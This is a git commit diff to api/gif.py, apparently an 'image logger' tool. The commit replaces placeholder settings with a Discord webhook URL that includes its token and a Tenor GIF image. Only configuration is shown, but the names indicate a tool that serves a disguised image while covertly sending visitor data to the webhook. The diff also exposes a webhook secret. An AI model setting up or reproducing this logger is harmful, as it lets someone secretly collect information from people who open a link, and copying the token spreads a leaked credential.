4451b4414f755d8d30f14b870b4a7ac79b72e11e
elliot577 <airrpods.1.1@gmail.com>
2025-12-25 21:40:15 +0000

    Update gif.py

--- api/gif.py
+++ api/gif.py
@@ -12,8 +12,8 @@ __author__ = "C00lB0i"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1453864207454830733/JdCQS1a6xi7dVwUTcbuSf6_xubOOHsiq1O6fzGUaS6VCgDxlfI-qS9DRJr7Njm1kkH04",
+    "image": "https://media.tenor.com/MHdZbqfnnhAAAAAe/stare-discord-mod.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
